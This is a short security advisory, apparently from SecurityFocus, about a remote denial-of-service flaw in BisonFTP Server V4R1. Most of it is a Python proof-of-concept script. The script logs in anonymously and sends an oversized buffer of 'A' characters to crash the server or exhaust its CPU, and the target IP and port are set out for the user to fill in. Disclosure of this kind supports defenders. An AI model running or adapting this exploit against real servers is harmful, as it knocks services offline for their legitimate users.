source: http://www.securityfocus.com/bid/14079/info

BisonFTP is prone to a remote denial-of-service vulnerability. A remote attacker may exploit this issue to deny service for legitimate users.

Reports indicate that the issue may be exploited only after successful authentication. 

#!/usr/bin/python
#
# Vulnerability: Denial Of Service
# Discovered on: June 26, 2005 by fRoGGz - SecuBox Labs
# When an invalid buffer size is sent to BisonFTPD -> DoS (100% CPU usage or crash)
# NB: Sorry for Python purists, it's the first time that i use it ;)

import socket
import time

n = 1
t = 98192 #Try others, it's funny.
p = 21 # Set your port here.
ip = "192.168.0.1" # Set ip here.
boom = "PoC "+'\x41'*t

print "\n\nVulnerable product: BisonFTP Server V4R1"
print "Denial of Service vulnerability"
print "---------------------------------------------"
print "Discovered & coded by fRoGGz - SecuBox Labs\n"

try:

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connect=s.connect((ip,p))

    d=s.recv(1024)

    print "[+] " +d

    print "[+] Utilisateur."

    time.sleep(1)

    s.send('USER Anonymous\r\n')

    s.recv(512)

    print "[+] Mot de passe."

    time.sleep(1)

    s.send('PASS Anonymous\r\n')

    s.recv(512)

    print "[+] Envoi malicieux.\n\nDoS termine !\n"

    time.sleep(1)

    s.send(boom+'r\n\n')


except:

    print "[+] Machine indisponible, verifiez le port ou l'ip."